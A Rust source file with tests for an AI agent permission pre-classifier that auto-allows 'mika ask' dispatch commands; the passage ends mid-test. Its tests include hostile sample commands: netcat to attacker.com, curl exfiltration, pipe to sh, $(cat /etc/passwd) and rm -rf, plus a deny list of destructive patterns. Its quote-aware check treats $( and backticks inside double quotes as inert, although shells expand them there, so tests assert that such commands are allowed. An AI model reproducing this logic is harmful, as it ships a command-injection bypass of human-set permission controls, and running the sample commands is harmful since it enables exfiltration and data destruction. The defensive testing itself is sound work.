//! Structural pre-classifier for mika-relay's permission decision pipeline.
//!
//! Before the permission-policy LLM classifier is invoked, this module recognizes
//! `[claude-pilot] ` PilotEvents carrying `mika ask --agent <peer>` for known
//! platform peers and returns `Allow` directly. Defense-in-depth for callers that
//! bypass claude-pilot's tier1 fast-path.
//!
//! See mika#935 for the origin issue and architectural rationale.

use serde::Deserialize;
use tracing::info;

use crate::well_known_agents::INTRA_PLATFORM_DISPATCH_PEERS;

/// The prefix that identifies a claude-pilot PilotEvent message.
const PILOT_EVENT_PREFIX: &str = "[claude-pilot] ";

/// Known-safe command prefixes for compound sub-commands (beyond mika-ask dispatch).
/// These are no-op shell built-ins that cannot cause side effects.
const SAFE_COMPOUND_PREFIXES: &[&str] = &["cd", "pwd", "true", "echo", ":", "test"];

/// Permission action returned by the pre-classifier.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PermissionAction {
    /// Allow the tool call without LLM consultation.
    Allow,
}

impl PermissionAction {
    /// Serialize to the JSON string the relay returns to claude-pilot.
    pub fn to_json_string(&self) -> String {
        match self {
            Self::Allow => r#"{"action":"allow"}"#.to_string(),
        }
    }

    /// Return as a serde_json::Value for direct use with axum's Json extractor.
    pub fn to_json_value(&self) -> serde_json::Value {
        match self {
            Self::Allow => serde_json::json!({"action": "allow"}),
        }
    }
}

/// Minimal PilotEvent structure for pre-classification.
/// Only the fields we need for structural matching.
#[derive(Debug, Deserialize)]
struct PilotEventBash {
    tool_name: String,
    tool_input: BashToolInput,
}

#[derive(Debug, Deserialize)]
struct BashToolInput {
    command: String,
}

/// TIER 3 dangerous patterns that always deny regardless of dispatch shape.
///
/// # Sentinel — cross-language duplication (mika#935, architect F5)
///
/// These patterns are mirrored from `claude-pilot-py/src/claude_pilot/tier1.py`.
/// `tier1.py` is the canonical source; this Rust module mirrors for defense-in-depth.
/// If the pattern set grows beyond 10 entries OR Python and Rust drift, escalate
/// to build-time codegen.
///
/// ## Branch 5 quote-aware on both sides (mika#946 resolved mika#938 follow-up)
///
/// Branch 5 (backtick/`$(` rejection) uses quote-aware scanning on both the Rust
/// side (here, via `contains_unquoted_metacharacter()`) and the Python side
/// (`tier1.py::contains_unquoted_metacharacter`). The POSIX single-quote
/// backslash-literal contract is mirrored across both. Divergence count: 0.
/// Companion PR: senara-solutions/claude-pilot-py#16.
const TIER3_PATTERNS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    "git push --force",
    "git push -f",
    "git reset --hard",
    "DROP TABLE",
    "cargo publish",
    "gh label delete",
    "gh label edit",
];

/// Pre-classify a pilot event message. Returns `Some(PermissionAction::Allow)` if the
/// message is an intra-platform agent dispatch that can be structurally allowed without
/// LLM consultation. Returns `None` to fall through to the existing LLM classifier.
///
/// # Decision branches
///
/// 1. `agent_id != "mika-relay"` → `None` (only the relay receives PilotEvents)
/// 2. Message doesn't start with `[claude-pilot] ` → `None`
/// 3. JSON parse fails → `None` (malformed; existing error path applies)
/// 4. `tool_name != "Bash"` → `None` (only Bash dispatch is pre-classified)
/// 5. Command contains `$(` or backtick OUTSIDE quoted regions → `None` (would trigger
///    shell command substitution on execution; literal occurrences inside `"..."` or
///    `'...'` are allowed — they're passed as message content to `mika ask`)
/// 6. Command matches intra-platform dispatch AND peer is known AND no TIER 3 → `Some(Allow)`
/// 7. Otherwise → `None`
pub fn pre_classify_pilot_event(user_message: &str, agent_id: &str) -> Option<PermissionAction> {
    // Branch 1: Only mika-relay processes PilotEvents
    if agent_id != "mika-relay" {
        return None;
    }

    // Branch 2: Must have the [claude-pilot] prefix
    let json_payload = user_message.strip_prefix(PILOT_EVENT_PREFIX)?;

    // Branch 3: Parse the PilotEvent JSON
    let event: PilotEventBash = serde_json::from_str(json_payload).ok()?;

    // Branch 4: Only handle Bash tool calls
    if event.tool_name != "Bash" {
        return None;
    }

    let command = &event.tool_input.command;

    // Branch 5: Reject commands with command substitution characters OUTSIDE quoted
    // regions. Backtick/`$(` inside `"..."` or `'...'` are literal message content
    // (e.g., markdown briefs with inline code). Only unquoted occurrences would trigger
    // shell expansion on actual execution. See mika#938 for the canary-v7 evidence.
    if contains_unquoted_metacharacter(command) {
        return None;
    }

    // Check for TIER 3 dangerous patterns in the full command
    if contains_tier3_pattern(command) {
        return None;
    }

    // Check if this is an intra-platform agent dispatch
    if let Some(peer) = classify_intra_platform_dispatch(command) {
        info!(
            target: "permission_policy",
            peer = peer,
            "structural-allow: intra-platform agent dispatch"
        );
        return Some(PermissionAction::Allow);
    }

    // Branch 7: Fall through to LLM classifier
    None
}

/// Check if a command contains any TIER 3 dangerous pattern.
fn contains_tier3_pattern(command: &str) -> bool {
    TIER3_PATTERNS.iter().any(|p| command.contains(p))
}

/// Check if a command contains `$(` or backtick outside quoted regions.
///
/// Walks the command bytes left-to-right, tracking quote state (none / single / double).
/// Returns `true` on first occurrence of `$(` or `` ` `` while in no-quote state.
/// Per Decision 1 Option C (mika#938): metacharacters inside either single or double
/// quoted regions are treated as literal (allowed).
///
/// Escape handling (mika#938 F1): `\"` inside double-quoted regions does NOT toggle quote
/// state — the scanner advances past the escape pair atomically. Inside single-quoted
/// regions, backslash is NOT an escape character (POSIX semantics): `'\''` is the literal
/// 2-char string `\` followed by the closing quote. The scanner mirrors bash here so that
/// `'foo\' \`evil\`` correctly closes the single quote at the second `'` and detects the
/// unquoted backtick that follows.
///
/// Unterminated quotes: if a quote opens and never closes, the scanner treats all remaining
/// bytes as inside the quote (conservative — falls through to LLM on malformed input).
fn contains_unquoted_metacharacter(command: &str) -> bool {
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    // None = not in a quote, Some(b) = inside a quote opened by byte b
    let mut quote_state: Option<u8> = None;

    while i < len {
        match quote_state {
            Some(q) => {
                // Inside a quoted region — advance past escapes (double-quoted only)
                // and look for close. POSIX: backslash has no special meaning inside
                // single-quoted strings, so `\` + `'` closes the quote.
                if q == b'"' && bytes[i] == b'\\' && i + 1 < len {
                    // Escaped character inside double-quoted region — skip the pair atomically
                    i += 2;
                    continue;
                }
                if bytes[i] == q {
                    // Closing quote — return to unquoted state
                    quote_state = None;
                }
                i += 1;
            }
            None => {
                // Unquoted region — check for metacharacters or quote openers
                if bytes[i] == b'\'' || bytes[i] == b'"' {
                    quote_state = Some(bytes[i]);
                    i += 1;
                    continue;
                }
                // Check for backtick
                if bytes[i] == b'`' {
                    return true;
                }
                // Check for `$(`
                if bytes[i] == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
                    return true;
                }
                i += 1;
            }
        }
    }

    false
}

/// Classify whether a command (possibly compound) is a pure intra-platform agent dispatch.
/// Returns the peer name if matched, or None if the command should fall through.
///
/// Security contract: ALL sub-commands in a compound must be recognized safe.
/// A compound with an unrecognized sub-command falls through to the LLM classifier.
///
/// Handles:
/// - Simple: `mika ask --agent mika-arch "message"`
/// - Env-var prefix: `MIKA_LOG_FORMAT=pretty mika ask --agent mika-arch "msg"`
/// - Compound with safe prefix: `cd /worktree && mika ask --agent mika-arch "msg"`
/// - Absolute path: `/home/user/.local/bin/mika ask --agent mika-arch "msg"`
/// - Equals form: `mika ask --agent=mika-arch "msg"`
/// - Flag reordering: `mika ask "msg" --agent mika-arch`
/// - Pipe to safe output: `mika ask --agent mika-arch "msg" 2>&1 | tail -20`
fn classify_intra_platform_dispatch(command: &str) -> Option<&'static str> {
    // Split compound commands on `&&`, `||`, `;`
    let sub_commands = split_compound_command(command);

    // ALL sub-commands must be safe. Find the dispatch peer in the mika-ask sub-command.
    let mut found_peer: Option<&str> = None;

    for sub in &sub_commands {
        let sub = sub.trim();
        if sub.is_empty() {
            continue;
        }

        if let Some(peer) = try_parse_mika_ask_dispatch(sub) {
            // This sub-command is a valid intra-platform dispatch
            found_peer = Some(peer);
        } else if is_safe_companion_sub_command(sub) {
            // Known-safe shell built-in (cd, pwd, etc.) — allow in compound
        } else {
            // Unrecognized sub-command — fall through to LLM for safety
            return None;
        }
    }

    found_peer
}

/// Check if a sub-command is a known-safe companion (e.g., `cd /worktree`).
fn is_safe_companion_sub_command(command: &str) -> bool {
    let tokens = shell_tokenize(command);
    if tokens.is_empty() {
        return true; // empty is safe
    }

    // Strip leading env-var assignments
    let skip = count_env_var_prefix(&tokens);
    let cmd_tokens = &tokens[skip..];
    if cmd_tokens.is_empty() {
        return true;
    }

    // Check if the first real token is a safe shell command
    let first = cmd_tokens[0];
    SAFE_COMPOUND_PREFIXES.contains(&first)
}

/// Try to parse a single sub-command as `mika ask --agent <peer>` dispatch.
/// Returns the peer name if it's a valid known-peer dispatch, None otherwise.
fn try_parse_mika_ask_dispatch(command: &str) -> Option<&'static str> {
    let command = command.trim();
    let tokens = shell_tokenize(command);

    // Strip leading environment variable assignments
    let skip = count_env_var_prefix(&tokens);
    let tokens = &tokens[skip..];

    // Handle pipe: everything after `|` must be a safe output command (tail, head, cat, tee)
    if let Some(pipe_pos) = tokens.iter().position(|t| *t == "|") {
        let pipe_target = &tokens[pipe_pos + 1..];
        if !is_safe_pipe_target(pipe_target) {
            return None;
        }
        // Only analyze tokens before the pipe for dispatch matching
        return try_match_mika_ask_in_tokens(&tokens[..pipe_pos], command);
    }

    try_match_mika_ask_in_tokens(tokens, command)
}

/// Safe pipe targets — read-only output formatting commands.
const SAFE_PIPE_TARGETS: &[&str] = &["tail", "head", "cat", "tee", "grep", "wc", "less", "more"];

/// Check if a pipe target is a safe output command.
fn is_safe_pipe_target(tokens: &[&str]) -> bool {
    if tokens.is_empty() {
        return false;
    }
    let cmd = tokens[0];
    SAFE_PIPE_TARGETS.contains(&cmd) || cmd.ends_with("/tail") || cmd.ends_with("/head")
}

/// Match `mika ask --agent <peer>` in a token sequence.
/// Returns the canonical peer name from INTRA_PLATFORM_DISPATCH_PEERS (static lifetime).
fn try_match_mika_ask_in_tokens(tokens: &[&str], _command: &str) -> Option<&'static str> {
    // Find `mika` (possibly with absolute path) as the command name
    let mika_pos = tokens
        .iter()
        .position(|t| *t == "mika" || t.ends_with("/mika"))?;

    // After `mika`, must have `ask` as the subcommand
    if mika_pos + 1 >= tokens.len() || tokens[mika_pos + 1] != "ask" {
        return None;
    }

    // Look for `--agent <peer>` or `--agent=<peer>` anywhere after `ask`
    let after_ask = &tokens[mika_pos + 2..];
    let peer = extract_peer_from_tokens(after_ask)?;

    // Verify peer is in the known platform dispatch list and return the static reference
    INTRA_PLATFORM_DISPATCH_PEERS
        .iter()
        .find(|&&p| p == peer)
        .copied()
}

/// Count leading tokens that match the pattern `KEY=VALUE` (env var assignments).
fn count_env_var_prefix(tokens: &[&str]) -> usize {
    tokens
        .iter()
        .take_while(|t| {
            t.contains('=')
                && t.split('=').next().is_some_and(|key| {
                    !key.is_empty()
                        && key
                            .chars()
                            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
                })
        })
        .count()
}

/// Extract the peer name from tokens after `ask`.
/// Handles:
/// - `--agent <peer>`
/// - `--agent=<peer>`
/// - `--agent "<peer>"` (quotes already stripped by tokenizer)
fn extract_peer_from_tokens<'a>(tokens: &'a [&'a str]) -> Option<&'a str> {
    let mut i = 0;
    while i < tokens.len() {
        let token = tokens[i];

        // Stop scanning at `--` separator (everything after is positional message)
        if token == "--" {
            break;
        }

        if token == "--agent" {
            // Next token is the peer name
            return tokens.get(i + 1).copied();
        }

        if let Some(peer) = token.strip_prefix("--agent=") {
            // Strip quotes if present
            let peer = peer.trim_matches('"').trim_matches('\'');
            return Some(peer);
        }

        i += 1;
    }
    None
}

/// Split a command string on compound separators (`&&`, `||`, `;`).
/// Does NOT split on `|` alone (that's a pipe, not a compound separator).
fn split_compound_command(command: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0;
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        // Skip quoted strings
        if bytes[i] == b'"' || bytes[i] == b'\'' {
            i = advance_past_quoted(bytes, i);
            continue;
        }

        // Check for `&&`
        if i + 1 < len && bytes[i] == b'&' && bytes[i + 1] == b'&' {
            parts.push(&command[start..i]);
            i += 2;
            start = i;
            continue;
        }

        // Check for `||`
        if i + 1 < len && bytes[i] == b'|' && bytes[i + 1] == b'|' {
            parts.push(&command[start..i]);
            i += 2;
            start = i;
            continue;
        }

        // Check for `;`
        if bytes[i] == b';' {
            parts.push(&command[start..i]);
            i += 1;
            start = i;
            continue;
        }

        i += 1;
    }

    parts.push(&command[start..]);
    parts
}

/// Advance past a quoted string (including the closing quote).
/// Handles escape sequences within quotes.
fn advance_past_quoted(bytes: &[u8], start: usize) -> usize {
    let quote = bytes[start];
    let len = bytes.len();
    let mut i = start + 1;
    while i < len && bytes[i] != quote {
        if bytes[i] == b'\\' {
            i += 1; // skip escaped char
        }
        i += 1;
    }
    if i < len {
        i + 1 // skip closing quote
    } else {
        i
    }
}

/// Simple shell tokenizer that splits on whitespace while respecting quotes.
/// Does NOT handle all shell features (command substitution, etc.) — this is
/// intentional for structural pre-classification.
fn shell_tokenize(input: &str) -> Vec<&str> {
    let mut tokens = Vec::new();
    let bytes = input.as_bytes();
    let len = bytes.len();
    let mut i = 0;

    while i < len {
        // Skip whitespace
        while i < len && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        if i >= len {
            break;
        }

        let start = i;

        // Handle quoted strings
        if bytes[i] == b'"' || bytes[i] == b'\'' {
            i = advance_past_quoted(bytes, i);
            // Return the content without outer quotes for simple cases
            let token = &input[start..i];
            if token.len() >= 2 {
                let inner = &token[1..token.len() - 1];
                tokens.push(inner);
            } else {
                tokens.push(token);
            }
            continue;
        }

        // Non-quoted token: read until whitespace
        while i < len && !bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        tokens.push(&input[start..i]);
    }

    tokens
}

#[cfg(test)]
mod tests {
    use super::*;

    // Helper to build a PilotEvent message with a raw JSON command value
    fn pilot_event_bash_raw(command_json: &str) -> String {
        format!(
            r#"[claude-pilot] {{"type":"permission","tool_name":"Bash","tool_input":{{"command":{}}},"tool_use_id":"test-123"}}"#,
            command_json
        )
    }

    // === Branch tests ===

    #[test]
    fn test_non_relay_agent_returns_none() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"hello\"""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-dev"), None);
    }

    #[test]
    fn test_non_pilot_event_returns_none() {
        let msg = "Hello, how are you?";
        assert_eq!(pre_classify_pilot_event(msg, "mika-relay"), None);
    }

    #[test]
    fn test_malformed_json_returns_none() {
        let msg = "[claude-pilot] {not valid json}";
        assert_eq!(pre_classify_pilot_event(msg, "mika-relay"), None);
    }

    #[test]
    fn test_non_bash_tool_returns_none() {
        let msg = r#"[claude-pilot] {"type":"permission","tool_name":"Read","tool_input":{"file_path":"/tmp/x"},"tool_use_id":"test-123"}"#;
        assert_eq!(pre_classify_pilot_event(msg, "mika-relay"), None);
    }

    // === Happy path tests ===

    #[test]
    fn test_simple_mika_ask_arch() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"Test message\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_simple_mika_ask_dev() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-dev \"Test message\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_simple_mika_ask_qa() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-qa \"Test message\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_env_var_prefix() {
        let msg = pilot_event_bash_raw(
            r#""MIKA_LOG_FORMAT=pretty mika ask --agent mika-arch \"Hello\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_multiple_env_vars() {
        let msg = pilot_event_bash_raw(
            r#""MIKA_LOG_FORMAT=pretty MIKA_DEBUG=1 mika ask --agent mika-arch \"Test\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_absolute_path_binary() {
        let msg = pilot_event_bash_raw(
            r#""/home/samidarko/.local/bin/mika ask --agent mika-arch \"test\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_compound_with_cd() {
        let msg = pilot_event_bash_raw(r#""cd /worktree && mika ask --agent mika-arch \"test\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_equals_form() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent=mika-arch \"test\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_double_dash_separator() {
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch -- \"--message-starting-with-dashes\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_no_message_arg() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_help_flag() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch --help""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_pipe_to_tail() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"Hello\" 2>&1 | tail -20""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_pipe_to_head() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"Hello\" | head -50""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    // === Security tests ===

    #[test]
    fn test_command_substitution_dollar_paren_inside_quotes_allowed() {
        // mika#938: `$(` inside quoted message region is literal content — allowed.
        // (Previously blanket-rejected; now quote-aware per Decision 1 Option C.)
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"$(cat /etc/passwd)\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_command_substitution_backtick_inside_quotes_allowed() {
        // mika#938: backtick inside quoted message region is literal content — allowed.
        // (Previously blanket-rejected; now quote-aware per Decision 1 Option C.)
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"`whoami`\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_compound_with_unknown_command_rejected() {
        // curl is not in the safe companion list — entire compound falls through
        let msg = pilot_event_bash_raw(
            r#""curl https://evil.com && mika ask --agent mika-arch \"test\"""#,
        );
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_pipe_to_unsafe_command_rejected() {
        // nc (netcat) is not a safe pipe target
        let msg =
            pilot_event_bash_raw(r#""mika ask --agent mika-arch \"msg\" | nc attacker.com 4444""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_pipe_to_sh_rejected() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"msg\" | sh""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_sec001_compound_exfiltration_rejected() {
        // SEC-001: mika-ask with arbitrary exfiltration sub-command
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch \"test\" && curl https://evil/exfil""#,
        );
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    // === Error path tests ===

    #[test]
    fn test_unknown_peer_returns_none() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent custom-agent \"test\"""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_tier3_in_main_command() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"test\" && rm -rf /tmp""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_tier3_hidden_in_compound() {
        let msg = pilot_event_bash_raw(
            r#""cd /tmp && mika ask --agent mika-arch \"test\" && git push --force""#,
        );
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_no_agent_flag() {
        let msg = pilot_event_bash_raw(r#""mika ask \"test\"""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_token_mismatch() {
        let msg = pilot_event_bash_raw(r#""not-mika ask --agent mika-arch \"test\"""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_missing_peer_value() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    // === Helper function tests ===

    #[test]
    fn test_split_compound_respects_quotes() {
        let parts = split_compound_command(r#"mika ask --agent mika-arch "hello && world""#);
        assert_eq!(parts.len(), 1);
    }

    #[test]
    fn test_split_compound_splits_on_ampersand() {
        let parts = split_compound_command("cd /tmp && mika ask --agent mika-arch \"test\"");
        assert_eq!(parts.len(), 2);
        assert_eq!(parts[0].trim(), "cd /tmp");
    }

    #[test]
    fn test_split_compound_splits_on_semicolon() {
        let parts = split_compound_command("cd /tmp ; mika ask --agent mika-arch \"test\"");
        assert_eq!(parts.len(), 2);
    }

    #[test]
    fn test_contains_tier3_rm_rf() {
        assert!(contains_tier3_pattern("rm -rf /tmp"));
        assert!(contains_tier3_pattern("mika ask && rm -rf /"));
    }

    #[test]
    fn test_contains_tier3_force_push() {
        assert!(contains_tier3_pattern("git push --force origin main"));
    }

    #[test]
    fn test_no_tier3_in_safe_command() {
        assert!(!contains_tier3_pattern(
            "mika ask --agent mika-arch \"hello\""
        ));
    }

    #[test]
    fn test_permission_action_json_string() {
        assert_eq!(
            PermissionAction::Allow.to_json_string(),
            r#"{"action":"allow"}"#
        );
    }

    #[test]
    fn test_permission_action_json_value() {
        let val = PermissionAction::Allow.to_json_value();
        assert_eq!(val["action"], "allow");
    }

    #[test]
    fn test_extract_peer_from_tokens_standard() {
        let tokens = vec!["--agent", "mika-arch", "hello"];
        assert_eq!(extract_peer_from_tokens(&tokens), Some("mika-arch"));
    }

    #[test]
    fn test_extract_peer_from_tokens_equals() {
        let tokens = vec!["--agent=mika-dev", "hello"];
        assert_eq!(extract_peer_from_tokens(&tokens), Some("mika-dev"));
    }

    #[test]
    fn test_extract_peer_from_tokens_after_double_dash() {
        // --agent should NOT be found after --
        let tokens = vec!["--", "--agent", "mika-arch"];
        assert_eq!(extract_peer_from_tokens(&tokens), None);
    }

    #[test]
    fn test_safe_companion_cd() {
        assert!(is_safe_companion_sub_command("cd /worktree"));
    }

    #[test]
    fn test_safe_companion_pwd() {
        assert!(is_safe_companion_sub_command("pwd"));
    }

    #[test]
    fn test_unsafe_companion_curl() {
        assert!(!is_safe_companion_sub_command("curl https://evil.com"));
    }

    #[test]
    fn test_unsafe_companion_arbitrary() {
        assert!(!is_safe_companion_sub_command("some-binary --flag"));
    }

    // === mika#938: Quote-aware metacharacter tests ===

    // --- contains_unquoted_metacharacter unit tests ---

    #[test]
    fn test_unquoted_meta_backtick_outside_quotes() {
        assert!(contains_unquoted_metacharacter("mika ask `whoami`"));
    }

    #[test]
    fn test_unquoted_meta_dollar_paren_outside_quotes() {
        assert!(contains_unquoted_metacharacter(
            "mika ask $(cat /etc/passwd)"
        ));
    }

    #[test]
    fn test_unquoted_meta_backtick_inside_double_quotes() {
        assert!(!contains_unquoted_metacharacter(
            r#"mika ask --agent mika-arch "brief with `inline code`""#
        ));
    }

    #[test]
    fn test_unquoted_meta_dollar_paren_inside_single_quotes() {
        assert!(!contains_unquoted_metacharacter(
            "mika ask --agent mika-arch '$(literal) text'"
        ));
    }

    #[test]
    fn test_unquoted_meta_dollar_paren_inside_double_quotes() {
        assert!(!contains_unquoted_metacharacter(
            r#"mika ask --agent mika-arch "$(literal) text""#
        ));
    }

    #[test]
    fn test_unquoted_meta_escaped_quote_inside_double_quotes() {
        // F1 mandatory: `\"` does not toggle quote state — backtick remains inside
        assert!(!contains_unquoted_metacharacter(
            r#"mika ask --agent mika-arch "has \"escaped\" and `backtick`""#
        ));
    }

    #[test]
    fn test_unquoted_meta_empty_string() {
        assert!(!contains_unquoted_metacharacter(""));
    }

    #[test]
    fn test_unquoted_meta_no_metacharacters() {
        assert!(!contains_unquoted_metacharacter(
            "mika ask --agent mika-arch \"hello\""
        ));
    }

    #[test]
    fn test_unquoted_meta_unterminated_quote_backtick_inside() {
        // Unterminated quote: scanner treats all remaining bytes as inside the quote
        // Backtick after the opening quote is inside → not detected → returns false
        assert!(!contains_unquoted_metacharacter(
            r#"mika ask --agent mika-arch "unterminated with `backtick"#
        ));
    }

    #[test]
    fn test_unquoted_meta_mixed_quotes() {
        // Single-quoted region containing a literal double-quote and backtick
        assert!(!contains_unquoted_metacharacter(
            r#"mika ask --agent mika-arch 'a"b`c'"#
        ));
    }

    #[test]
    fn test_unquoted_meta_backslash_in_single_quotes_does_not_escape_close() {
        // POSIX: backslash is NOT an escape character inside single-quoted regions.
        // `'foo\'` closes at the second `'` (the `\` is literal). The backtick that
        // follows is therefore unquoted and must be detected. Regression for the
        // mika#938 review finding (3-way reviewer agreement).
        assert!(contains_unquoted_metacharacter(
            r#"mika ask 'foo\' `whoami`"#
        ));
    }

    #[test]
    fn test_unquoted_meta_backslash_in_single_quotes_dollar_paren() {
        // Same divergence — but with `$(...)` instead of backtick.
        assert!(contains_unquoted_metacharacter(
            r#"mika ask 'foo\' $(curl evil)"#
        ));
    }

    #[test]
    fn test_unquoted_meta_backslash_inside_double_quotes_still_escapes() {
        // Sanity check that the double-quoted path still treats `\"` as an escape.
        // Without escape handling, the inner `\"` would close the double-quoted region
        // and the trailing backtick would be detected as unquoted (false positive).
        assert!(!contains_unquoted_metacharacter(
            r#"mika ask "has \"escaped\" `safe`""#
        ));
    }

    #[test]
    fn test_unquoted_meta_backtick_after_closing_quote() {
        // Backtick appears AFTER the quoted region closes → unquoted → detected
        assert!(contains_unquoted_metacharacter(
            r#"mika ask --agent mika-arch "msg" `rm -rf /`"#
        ));
    }

    #[test]
    fn test_unquoted_meta_dollar_paren_after_closing_quote() {
        assert!(contains_unquoted_metacharacter(
            r#"mika ask --agent mika-arch "msg" $(rm -rf /)"#
        ));
    }

    // --- Integration tests: pre_classify_pilot_event with quote-aware metacharacter handling ---

    #[test]
    fn test_938_markdown_brief_with_backticks_in_double_quotes() {
        // The canonical /mika-ask-arch form from canary v7 that was denied
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch --format json --verbose \"Brief with `inline code` and `docs/plans/file.md`\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_938_dollar_paren_in_single_quoted_message() {
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch --format json --verbose '$(literal) text'""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_938_combined_flags_and_session_id_with_backtick() {
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch --format json --verbose --session-id abc-123 \"Second-pass review with `session_id` reference\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_938_mika_dev_peer_with_backtick_in_message() {
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-dev --format json --verbose \"Brief with `code`\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_938_mika_qa_peer_with_backtick_in_message() {
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-qa --format json --verbose \"Brief with `code`\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_938_escaped_inner_quotes_with_backtick() {
        // F1 mandatory fixture: escaped quotes inside double-quoted region
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch \"has \\\"escaped\\\" and `backtick`\"""#,
        );
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_938_empty_message() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"\"""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }

    #[test]
    fn test_938_backtick_outside_quotes_rejected() {
        // Backtick OUTSIDE the quoted message — would expand on shell execution
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"msg\" `rm -rf /`""#);
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_938_dollar_paren_outside_quotes_rejected() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"msg\" $(rm -rf /)""#);
